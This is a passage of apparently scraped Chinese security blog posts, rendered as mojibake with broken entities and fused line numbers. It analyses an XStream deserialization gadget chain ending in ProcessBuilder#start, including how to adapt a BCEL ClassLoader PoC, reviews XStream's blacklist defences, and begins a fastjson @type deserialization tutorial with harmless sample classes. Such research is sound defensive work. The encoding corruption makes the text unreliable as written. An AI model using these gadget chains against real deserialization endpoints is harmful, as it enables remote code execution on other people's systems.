å…³æ³¨jdk.nashorn.internal.objects.NativeString#hashCode åç»­è°ƒç”¨getStringValueå‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°é‡Œå»è°ƒç”¨äº†this.value.toString()ï¼Œè¿™é‡Œçš„valueçš„ç±»å‹ä¸ºCharSequenceï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰¾å¯ä»¥åˆ©ç”¨çš„CharSequenceçš„å®ç°ç±»ï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toStringå‡½æ•° è¿™é‡Œç´§æ¥ç€ä¼šå»è°ƒç”¨ByteArrayOutputStreamExçš„readFromï¼Œè¿™ä¸ªå‡½æ•°ç”¨åˆ°çš„ä¸»è¦æ˜¯è¿™è¾¹ä¼ å…¥çš„InputStreamçš„readå‡½æ•° å®é™…ä¸Šisæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå› ä¸ºè¿™é‡Œè°ƒç”¨çš„this.dataHandler.getDataSource().getInputStream()ï¼Œä»–çš„å€¼ä¼ é€’éƒ½å¯ä»¥ç”¨ç±»å±æ€§çš„æ–¹å¼æŠŠä»–æ„å»ºå‡ºæ¥ï¼Œåˆ†åˆ«æ˜¯ 123451. this.dataHandler == æ„é€ å¥½çš„DataHandler2. DataHandlerçš„dataSourceå±æ€§ == æ„é€ å¥½çš„XmlDataSource3. XmlDataSourceè°ƒç”¨getInputStream()å‡½æ•°è¿”å›æ„é€ å¥½çš„inputStream// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource ç”¨è¿™ç§æ–¹æ³•å°±å¯ä»¥è·å–ä¸€ä¸ªå¯æ§çš„inputStreamï¼Œå¹¶ä¸”åç»­ä¼šå»è°ƒç”¨readå‡½æ•° ç»§ç»­çœ‹ä¸‹å»ï¼Œjavax.crypto.CipherInputStream#read æ­¤æ—¶éœ€è¦æ„é€ ä¸€ä¸ªCipherç±»å‹ï¼Œå¹¶ä¸”åç»­è°ƒç”¨Cipher.updateå‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ç”¨javax.crypto.NullCipheræ¥å¡«å……ï¼Œå› ä¸ºæœ€ç»ˆç”¨åˆ°çš„æ˜¯çˆ¶ç±»Cipher.updateï¼Œåªè¦ä¸é‡è½½updateï¼Œå…¶ä»–çš„å­ç±»ä¹Ÿå¯ä»¥ã€‚ ç»§ç»­çœ‹Cipher.update è¯´äº†é‚£ä¹ˆä¹…ï¼Œæˆ‘ä»¬ç»ˆäºåˆ°äº†è‡³å…³é‡è¦çš„ä¸€ä¸ªåœ°æ–¹ï¼ŒserviceIterator.nextå‡½æ•° åç»­æˆ‘ä»¬å°†è°ƒç”¨ImageIOä¸‹çš„javax.imageio.spi.FilterIterator#next advanceå‡½æ•°ä¼šå»è°ƒç”¨filter.filterå‡½æ•°ï¼Œè€ŒImageIOå­˜åœ¨ä¸€ä¸ªæœ‰è¶£çš„filter javax.imageio.ImageIO.ContainsFilter#filter æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ªMethodå¯¹è±¡å»invokeï¼Œåˆ°äº†è¿™é‡Œå°±æ˜¯æ¿€åŠ¨äººå¿ƒçš„Javaåå°„æœºåˆ¶äº†ï¼Œæˆ‘ä»¬æå‰æ„é€ å¥½methodå¯¹è±¡ï¼Œå°±å¯ä»¥è°ƒç”¨ä»»æ„çš„å‡½æ•°ã€‚ åˆ©ç”¨é“¾æ¯”è¾ƒé•¿ï¼Œæ•´ç†ä¸€ä¸‹è¿‡ç¨‹ 123456789XStream å¤„ç†Mapç±»å‹ å»è°ƒç”¨jdk.nashorn.internal.objects.NativeString#hashCode com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString javax.activation.DataHandler#getDataSource com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream javax.crypto.CipherInputStream#read -&gt; getMoreData javax.crypto.NullCipher#update -&gt; chooseFirstProvider javax.imageio.spi.FilterIterator#next javax.imageio.ImageIO.ContainsFilter#filter ProcessBuilder#start ä»åé¢å¾€å‰çœ‹çš„è¯ï¼Œæˆ‘ä»¬å‰é¢åšçš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†èƒ½å»è§¦å‘Iterator.nextï¼Œè€Œè¿™ç§Iteratorçš„éå†å¤„ç†ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å†æ‰¾åˆ°ä¸€å¤„ï¼Œä¸‹ä¸€èŠ‚å°±æ˜¯ä¸ç”¨javax.imageio.ImageIO.ContainsFilter#filteræ¥å®ç°åˆ©ç”¨ï¼Œè¯·ç»§ç»­å¾€ä¸‹çœ‹XD 5. ServiceFinder$LazyIteratoræ€è·¯æ¥è‡ªæ–‡ç« 1ã€æ–‡ç« 2) å…ˆæ¥çœ‹ä¸€ä¸‹java.util.ServiceLoader.LazyIterator#next å½“ç±»å±æ€§accä¸ºç©ºæ—¶ï¼Œä¼šå»è°ƒç”¨nextServiceå‡½æ•°ï¼Œè€Œåœ¨è¯¥å‡½æ•°é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä»¤äººç†Ÿæ‚‰çš„Class.forNameçš„è°ƒç”¨ã€‚å¹¶ä¸”æˆ‘ä»¬å»å®ä¾‹åŒ–çš„classnameã€loaderï¼Œéƒ½æ˜¯ç±»å±æ€§ï¼Œå±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ä¸œè¥¿ã€‚ åˆ°äº†è¿™é‡Œè‡ªç„¶è€Œç„¶çš„å°±æƒ³åˆ°äº†ä½¿ç”¨BCELçš„ClassLoaderæ¥è½½å…¥classnameé‡Œçš„å­—èŠ‚ç äº†(è¿™é‡Œæˆ‘åœ¨fastjsoné‚£ç¯‡é‡Œæåˆ°è¿‡)ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ImageIOé‚£æ¡é“¾çš„åŸºç¡€ä¸Šï¼Œåœ¨è§¦å‘Iterator.nextæ—¶ä½¿ç”¨è¿™ä¸ªLazyIteratoræ¥ä»£æ›¿ ä¿®æ”¹BCEL ClassLoaderæ„é€ POCè¿™é‡Œæ¥æä¸€ä¸‹å…³äºPOCçš„æ„é€ ï¼Œå¦‚æœä½ ä½¿ç”¨äº†å½“å‰è¿™ä¸ªåˆ©ç”¨é“¾ï¼Œå¹¶ä¸”ä¸å¯¹ClassLoaderåšå¤„ç†çš„è¯ï¼Œä½ ä¼šå‘ç°æ€ä¹ˆéƒ½æ‰“ä¸é€šï¼Œå› ä¸ºè¿™é‡Œåœ¨å®é™…è¿˜åŸClassLoaderçš„æ—¶å€™å‡ºç°äº†é”™è¯¯ è¿™é‡Œæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€æ˜¯å»é™¤è¿™ç§è¿˜åŸæœ‰é—®é¢˜çš„ç±»ï¼ˆä¼šå¾ˆéº»çƒ¦ï¼‰ï¼ŒäºŒæ˜¯ç›´æ¥æŠŠClassLoaderé‡Œçš„ä¸€äº›æ— å…³ç´§è¦çš„ä¸œè¥¿å‰”é™¤æ‰ã€‚ è¿™é‡Œæˆ‘é€‰æ‹©äº†ç¬¬äºŒç§ï¼Œç»è¿‡è°ƒè¯•å»é™¤äº†ä»¥ä¸‹å‡ ä¸ªå±æ€§çš„å€¼ è¿™é‡Œç”±äºæˆ‘ä»¬å‰”é™¤äº†ignored_packageså’ŒdeferToï¼Œå¯¼è‡´BCELçš„ClassLoaderåœ¨è½½å…¥æ™®é€šçš„ç±»çš„æ—¶å€™ä¼šå‡ºç°åŠ è½½é”™è¯¯çš„é—®é¢˜ æ¥çœ‹çœ‹æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ é¦–å…ˆBCELçš„ClassLoader.loadClassï¼Œä¸€å…±å°è¯•4æ¬¡ä¸åŒçš„è½½å…¥æ–¹æ³• ä»å½“å‰ClassLoaderçš„classeså»æ‰¾ å¯¹äºé»˜è®¤å¿½ç•¥çš„åŒ…java./sun./javax.ï¼Œä½¿ç”¨deferToå»é‡æ–°åŠ è½½ï¼Œè¿™é‡Œçš„deferToæ˜¯ç³»ç»Ÿçš„ClassLoaderï¼ˆClassLoader.getSystemClassLoader()) å¯¹äºclassnameä»¥$$BCEL$$å¼€å¤´çš„ï¼Œæ ¹æ®classnameçš„å€¼å»defineClassï¼Œè¿™è¾¹å°±æ˜¯æˆ‘ä»¬æœ€å–œæ¬¢çš„ä»»æ„è½½å…¥å­—èŠ‚ç çš„åœ°æ–¹ æœ€åä¸€æ¬¡æ˜¯ç”¨repositoryå»è½½å…¥å½“å‰çš„classnameï¼Œå¦‚æœè¿™é‡Œè¿˜æ²¡æ‰¾åˆ°ï¼Œå°±ä¼šçˆ†æ²¡æœ‰æ‰¾åˆ°Classçš„é”™è¯¯ PSï¼šè¿™éƒ¨åˆ†repositoryå–çš„SyntheticRepository.getInstance()ï¼Œè¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™ä¸ªå·¦å³ï¼Œåç»­æ•´ç†ä¸€ä¸‹ClassLoaderç›¸å…³çš„çŸ¥è¯†å†åšè¡¥å…… å†æ¥çœ‹æˆ‘ä»¬æŠ¥é”™çš„åŸå› ï¼Œå› ä¸ºåˆ é™¤ignored_packageså’ŒdeferToä¹‹åï¼Œç›¸å½“äºç¬¬äºŒç§æƒ…å†µæ— æ³•è½½å…¥äº†ï¼Œè€Œæ˜¾ç„¶java.lang.Objectä¸ç¬¦åˆç¬¬ä¸‰ç§æƒ…å†µã€‚æœ€åç¬¬4ç§é‡Œé¢ä¹Ÿæ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªjava.lang.Objectï¼Œæ‰€ä»¥æœ€ç»ˆçˆ†äº†ClassNotFoundException è¿™é‡Œå…¶å®å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¾—åœ¨classesé‡Œæ·»åŠ æˆ‘ä»¬ä¼ å…¥çš„classå­—èŠ‚ç é‡Œæ‰€ç”¨åˆ°çš„æ‰€æœ‰ç±»ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€æ¬¡å°è¯•è½½å…¥çš„æ—¶å€™ï¼Œå°±æ‰¾åˆ°äº†ç›¸åº”çš„ç±»ï¼Œæ— éœ€å°è¯•åç»­çš„å‡ ç§è½½å…¥æ–¹å¼ã€‚ æ¯”å¦‚è¿™é‡Œæˆ‘äº§ç”Ÿçš„å­—èŠ‚ç é‡Œé¢ç”¨ä¸Šäº†Runtimeï¼Œå°±å¾—åŠ ä¸Šè¿™ä¸ªç±» è¿™é‡Œçš„Objectå¿…é¡»åŠ ä¸Šï¼Œæ¯•ç«Ÿæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿è‡ªObject 0x03 XStreamçš„é˜²å¾¡æªæ–½ XStreamåœ¨1.4.7ç‰ˆæœ¬ä¹‹åæ”¯æŒä½¿ç”¨ç™½åå•å’Œé»‘åå•çš„æ–¹å¼æ¥æ–¹å¼æ¶æ„ç±»çš„ååºåˆ—åŒ–security Starting with XStream 1.4.7, it is possible to define permissions for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source. XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement. è¿™é‡Œä¸»è¦çœ‹ä¸€ä¸‹é»‘åå•çš„å¤„ç† 1.4.7-1.4.9EventHandlerçš„å¤„ç†ç”±ReflectionConverteræ¥å¤„ç†çš„ï¼Œåœ¨1.4.7-1.4.9ç‰ˆæœ¬ï¼Œåœ¨canConvertå¤„æ·»åŠ äº†å¯¹EventHandlerçš„é™åˆ¶ æ‰€ä»¥EventHandlerçš„POCå°±å¤±æ•ˆäº†ï¼Œä½†æ˜¯å…¶ä»–çš„å‡ ç§å¹¶æ²¡æœ‰å¤±æ•ˆ &gt;=1.4.10åœ¨1.4.10ç‰ˆæœ¬å¢åŠ äº†setupDefaultSecurityæ–¹å¼æ¥è®¾ç½®é»˜è®¤çš„ç™½åå•ï¼Œä½†æ˜¯è¿™ä¸ªç‰ˆæœ¬æŠŠä¸Šé¢EventHandlerçš„é™åˆ¶å»æ‰äº†ï¼Œå¯¼è‡´åˆå¯ä»¥ä½¿ç”¨æœ€æ—©çš„POCï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯æ²¡ä¿®è¡¥å‰çš„1.4.10ï¼Œä¿®å¤åå·²ç»ä¸å¯ä»¥äº† é™¤äº†æ–°å¢è®¾ç½®ç™½åå•çš„æ–¹å¼ï¼Œä¹Ÿæ–°å¢åŠ äº†InternalBlackListè¿™ä¸ªconverterï¼Œä»–è®¾ç½®çš„æƒé™ä¸ºLOWï¼Œè€ŒReflectionConverteræƒé™ä¸ºVery_lowï¼Œæ‰€ä»¥ä¼šå…ˆè¿‡ä¸€æ¬¡é»‘åå•æ£€æŸ¥ï¼ˆXStreamåœ¨æ³¨å†Œconvertersæ—¶ï¼Œä»¥æƒé™çš„æ–¹å¼æ¥å†³å®šæ¬¡åºï¼‰ã€‚ æ‰€ä»¥è¿™é‡Œ1,4,5éƒ½è·ªäº†ï¼Œåªå‰©ä¸‹groovyè¿™ç§äº†ï¼Œå½“ç„¶è‚¯å®šè¿˜æœ‰å…¶ä»–æ²¡æœ‰å‘ç°çš„åˆ©ç”¨é“¾ï¼Œæ‰€ä»¥æœ€å®‰å…¨çš„æ–¹æ³•è¿˜æ˜¯ä½¿ç”¨ç™½åå•çš„æ–¹å¼ï¼Œä¸èƒ½ä¾èµ–XStreamçš„é»‘åå•æ¥åšå®‰å…¨é˜²å¾¡ã€‚ 0x04 æ€»ç»“ æœ¬æ–‡ä¸»è¦å›é¡¾äº†ç°æœ‰çš„ä¸€äº›åˆ©ç”¨é“¾ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼š å¦‚æœXStreamç”¨çš„ä¸æ˜¯ç™½åå•æ¨¡å¼ï¼Œè¿˜æ˜¯å­˜åœ¨åˆ©ç”¨çš„å¯èƒ½æ€§çš„ã€‚ç°æœ‰å†…ç½®çš„é»‘åå•åªç¦æ­¢äº†å‡ ä¸ªç°æœ‰çš„åˆ©ç”¨é“¾ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥æ‰¾åˆ°å…¶ä»–å¯ä»¥åˆ©ç”¨çš„åˆ©ç”¨é“¾çš„ï¼Œæ¯”å¦‚å‰é¢æåˆ°çš„Groovyçš„åˆ©ç”¨é“¾ã€‚ éœ€è¦è®°ä½çš„æ˜¯XStreamä»–çš„è§¦å‘æ–¹å¼ä¾èµ–çš„æ˜¯HashMapã€TreeSetè¿™ç§ç±»å‹è‡ªåŠ¨è°ƒç”¨çš„hashCodeã€compareToä¸²èµ·æ¥çš„ï¼Œåç»­å¯ä»¥æ³¨æ„ä¸€ä¸‹è¿™ç§å¯èƒ½çš„è°ƒç”¨é“¾ã€‚ PSï¼šæœ¬æ–‡æåˆ°çš„æ‰€æœ‰POCï¼Œå·²ç»æ›´æ–°åˆ°GitHubä¸Š"},{"title":"æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´","permalink":"http://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/","text":"0x00 å‰è¨€æœ€è¿‘åˆç¢°ä¸Šäº†fastjsonçš„é¢˜ç›®ï¼Œæƒ³ç€æ˜¯æ—¶å€™åˆ†æä¸€æ³¢è¿™ä¸ªæ¼æ´äº†ï¼Œè·Ÿä¸Šå¸ˆå‚…ä»¬çš„è„šæ­¥ã€‚ 0x01 åŸºç¡€çŸ¥è¯† (1). fastjsonçš„åŸºç¡€ä½¿ç”¨ fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚ å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Phone &#123; public String phoneNumber; public Phone() &#123; &#125; public Phone(String phoneNumber) &#123; this.phoneNumber = phoneNumber; &#125; @Override public String toString()&#123; return this.phoneNumber; &#125;&#125;public class NewPhone extends Phone &#123; public String location; public NewPhone()&#123; &#125; public NewPhone(String phoneNumber, String location) &#123; this.phoneNumber = phoneNumber; this.location = location; &#125; @Override public String toString()&#123; return this.phoneNumber+\":\"+this.location; &#125;&#125;public class Person &#123; public String name; public Phone phone; public Person() &#123; &#125; public Person(String name, Phone phone) &#123; this.name = name; this.phone = phone; &#125; @Override public String toString()&#123; return name+\":\"+phone; &#125;&#125; ä¸Šé¢åŒ…æ‹¬äº†3ä¸ªç®€å•çš„å¯¹è±¡Personã€Phoneä»¥åŠNewPhoneï¼Œæˆ‘ä»¬ç”¨fastjsonå°†Personå¯¹è±¡è½¬åŒ–æˆä¸€ä¸ªjsonå­—ç¬¦ä¸²ï¼Œå¹¶è¿˜åŸ 123456789Phone phone = new Phone(\"1234567890\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output // &#123;\"name\":\"john\",\"phone\":&#123;\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 è°ƒç”¨fastjsonçš„toJSONStringå¯ä»¥è½»æ˜“åœ°å°†objectè½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ç”¨parseObjectå°†jsonå­—ç¬¦ä¸²è¿˜åŸå‡ºæ¥ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé™åˆ¶å°±æ˜¯ 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"name\":\"john\",\"phone\":&#123;\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 åœ¨ä¸Šé¢çš„å†™æ³•ä¸­ï¼Œç”±äºfastjsonä¸çŸ¥é“éœ€è¦è¿˜åŸçš„Personçš„Phoneæ˜¯æœ¬èº«è¿˜æ˜¯å­ç±»NewPhoneï¼Œé¢å¯¹è¿™ç§å¤šæ€æ–¹å¼ï¼Œfastjsonè¿˜åŸæ˜¯çˆ¶ç±»ï¼Œè€Œä¸æ˜¯å­ç±»NewPhoneã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸¢å¤±äº†Jsonå­—ç¬¦ä¸²ä¸­phoneçš„locationå­—æ®µã€‚è¿™æ˜¾ç„¶æ˜¯ä¸å¯å¿å—çš„ï¼Œæ‰€ä»¥fastjsonç»™æˆ‘ä»¬æä¾›äº†æŒ‡å®šè¿˜åŸç±»çš„å­—æ®µ@typeæ–¹æ³• 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"@type\":\"org.vultest.base.Person\",\"name\":\"john\",\"phone\":&#123;\"@type\":\"org.vultest.base.NewPhone\",\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890:China é€šè¿‡åœ¨toJSONStringçš„æ—¶å€™æŒ‡å®šSerializerFeatureï¼ˆSerializerFeature.WriteClassNameï¼‰ï¼Œä½¿å¾—è½¬åŒ–åçš„jsonå­—ç¬¦ä¸²å¤šäº†@typeå­—æ®µã€‚è¿™ä¸ªå­—æ®µæŒ‡ä»£äº†å½“å‰ç±»çš„classï¼Œé¿å…äº†ä¸Šé¢çš„å­ç±»ä¸¢å¤±å­—æ®µçš„é—®é¢˜ã€‚æ¯”å¦‚ä¸Šé¢ç›´æ¥æŒ‡å®šäº†Personå¯¹è±¡çš„phoneå±æ€§çš„ç±»æ˜¯NewPhoneï¼Œè¿˜åŸåæˆåŠŸæ‰“å°å‡ºlocationã€‚ åˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœ@typeè¢«æŒ‡å®šä¸ºæŸæ¶æ„çš„ç±»ï¼Œæ˜¯å¦ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Ÿ (2).fastjsonçš„æµç¨‹ç®€ä»‹ è¿™é‡Œç›´æ¥å‚è€ƒhttps://paper.seebug.org/994/ ç”¨ä¸€ä¸‹å»–å¤§çš„æµç¨‹å›¾ å…·ä½“çš„åˆ†æè¿‡ç¨‹çœ‹ä¸Šé¢çš„é‚£ç¯‡æ–‡ç« å³å¯ï¼Œè¿™é‡Œæä¸€ä¸‹å°†ASMåŠ¨æ€ç”Ÿæˆçš„ä»£ç dumpå‡ºæ¥çš„æ–¹æ³• åœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼ŒASMåŠ¨æ€ç”Ÿæˆäº†ç›¸åº”çš„bytecodesï¼Œè¿™é‡Œç”¨ideaçš„æ–­ç‚¹æ¥dumpæºç  å…ˆå°†æ–­ç‚¹ä¸‹åœ¨com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80 ç”Ÿæˆçš„bytecodesåœ¨codeé‡Œï¼Œç”¨æ‰§è¡Œè¡¨è¾¾å¼çš„åŠŸèƒ½ï¼Œæ‰§è¡Œ(new FileOutputStream(&quot;some.class&quot;)).write(code)å³å¯ç”Ÿæˆ (3). fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetterç±»ä¼¼Javaçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨readObjectå‡½æ•°ï¼Œfastjsonè¿˜åŸå¯¹è±¡æ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨ä»¥ä¸‹å‡ ä¸ªå‡½æ•°ï¼š æ— å‚æ•°çš„æ„é€ å‡½æ•° ç¬¦åˆæ¡ä»¶çš„getterå‡½æ•° ç¬¦åˆæ¡ä»¶çš„setterå‡½æ•° è¿™é‡Œéœ€è¦åŒºåˆ«çš„æ˜¯fastjsonæ‰€ä½¿ç”¨çš„parseå‡½æ•°å’ŒparseObjectå‡½æ•°æ‰€è°ƒç”¨çš„å‡½æ•°æ¡ä»¶æ˜¯ä¸ä¸€æ ·çš„ã€‚ï¼ˆpsï¼šåºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨æ‰€æœ‰gettersï¼‰ 1. parse å’Œ parseObjectçš„åŒºåˆ«æ¥çœ‹ä¸€ä¸‹parseObjectå‡½æ•° è¿™é‡ŒparseObjectå‡½æ•°ä¼šé¦–å…ˆè°ƒç”¨JSON.parseå‡½æ•°ï¼Œç„¶åå†å»è°ƒç”¨toJSONå‡½æ•°ã€‚ è¿™é‡ŒtoJSONä¼šæŠŠobjå¥—ä¸€å±‚JSONObjectå¯¹è±¡ï¼Œä»–çš„å®ç°æ–¹æ³•æ˜¯å…ˆnewä¸€ä¸ªJSONObjectï¼ŒæŠŠobjå¯¹è±¡ç»™å¡«å……è¿›å»ï¼›ç„¶åè°ƒç”¨toJSONStringæŠŠç”Ÿæˆçš„JSONObjectè½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸²ï¼›æœ€åå†è°ƒç”¨parseå‡½æ•°å°†è¿™ä¸ªjsonå­—ç¬¦ä¸²ç»™è¿˜åŸã€‚ è¿™é‡Œçš„toJSONStringæ˜¯æˆ‘ä»¬åºåˆ—åŒ–çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œä»–ä¼šå»è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰gettersï¼Œä¹Ÿå°±æ„å‘³ç€parseObjectå‡½æ•°ä¼šä¸»åŠ¨å»è°ƒgetterså’Œsettersï¼Œè€Œparseå‡½æ•°åˆ™ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„setterså’Œç¬¦åˆæ¡ä»¶çš„getters(è¿™éƒ¨åˆ†è§åæ–‡)ã€‚ é‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€ï¼ŒparseObjectæ¯”parseå‡½æ•°å¤šäº†ä¸€ä¸ªè°ƒç”¨æ‰€æœ‰gettersçš„åˆ©ç”¨ç‚¹ã€‚ 2. parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘æ¥ç€æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹JSON.parseå‡½æ•°è‡ªåŠ¨è°ƒç”¨getterså’Œsettersçš„é€»è¾‘ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹è°ƒç”¨æµç¨‹ï¼Œä»¥ä¸‹åˆ†æfastjsonç‰ˆæœ¬1.2.24 com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialzeï¼ˆpsï¼šè¿™é‡Œå¾ˆé¸¡è´¼çš„æŠŠdeserializeçš„iç»™çœç•¥äº†ï¼‰ é¦–å…ˆæ˜¯ç¬¬570è¡Œè°ƒç”¨äº†createInstanceå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ä¼šå¯¹å½“å‰è¿˜åŸçš„ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œä¼šè‡ªåŠ¨è°ƒç”¨æ— å‚æ•°çš„æ„é€ å‡½æ•° å…¶æ¬¡æ˜¯ç¬¬600è¡Œè°ƒç”¨äº†parseFieldå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†å¯¹æ¯ä¸ªç±»å±æ€§è¿›è¡Œåˆå§‹åŒ–(æˆ–é€’å½’ç”Ÿæˆæ–°çš„å¯¹è±¡) è·Ÿè¿›parseFieldå‡½æ•° è¿™é‡Œè°ƒç”¨äº†com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseFieldå‡½æ•°ï¼Œç›´æ¥çœ‹å…³é”®ç‚¹ç¬¬83è¡Œï¼Œè°ƒç”¨äº†setValueå‡½æ•° setValueå‡½æ•°å°±æ˜¯fastjsonè‡ªåŠ¨è°ƒç”¨getterå’Œsetterçš„å…³é”®ç‚¹ å¦‚æœä¸å­˜åœ¨ç›¸åº”çš„getterã€setterã€iså‡½æ•°ï¼Œåˆ™åˆ©ç”¨åå°„æœºåˆ¶å°†valueèµ‹å€¼åˆ°å½“å‰çš„objectä¸Šï¼ˆè¿™é‡Œå°±æ˜¯elseéƒ¨åˆ†åšçš„äº‹æƒ…ï¼‰ã€‚ è€Œå½“fieldInfoå­˜åœ¨å‡½æ•°æ—¶ï¼Œå¦‚æœåŒæ—¶å­˜åœ¨getterå’Œsetterï¼Œåˆ™è°ƒç”¨setterï¼Œå¦‚æœåªå­˜åœ¨getteråˆ™è°ƒç”¨getterã€‚ è¿™é‡Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹fieldInfoçš„methodæ˜¯æ€ä¹ˆå¡«å……çš„å‘¢ï¼Ÿè¿™é‡Œè¦çœ‹com/alibaba/fastjson/util/JavaBeanInfo.java#buildå‡½æ•°ï¼ŒParserConfigåœ¨createJavaBeanDeserializerå‡½æ•°ä¸­ä¼šè°ƒç”¨JavaBeanInfo.buildå‡½æ•°ï¼Œä»¥æ­¤å¡«å……fieldInfoï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ†æçš„å‡ ä¸ªmethodã€‚ ä¸çœ‹å…·ä½“çš„ä»£ç ï¼Œå†™ä¸€ä¸‹ç­›é€‰çš„æ¡ä»¶ï¼š setteræå–æ¡ä»¶ï¼š å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4 éé™æ€å‡½æ•° é™åˆ¶è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±» å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ª å‡½æ•°åä»¥setå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™æˆ–è€…unicdeæˆ–è€…_æˆ–è€…å­—æ¯fï¼›å¦‚æœå‡½æ•°åé•¿åº¦&gt;=5ï¼Œçœ‹ç¬¬5ä½å­—ç¬¦æ˜¯ä¸æ˜¯å¤§å†™çš„ getteræå–æ¡ä»¶ï¼š å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4 éé™æ€å‡½æ•° å‡½æ•°åä»¥getå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦å¤§å†™ å‡½æ•°å‚æ•°ä¸º0ä¸ª å‡½æ•°çš„è¿”å›ç±»å‹ä¸ºCollectionçš„å­ç±»æˆ–æœ¬èº«ã€Mapçš„å­ç±»æˆ–æœ¬èº«ã€AtomicBooleanã€AtomicIntegerã€AtomicLong æ— ç›¸å¯¹åº”çš„setterå‡½æ•° 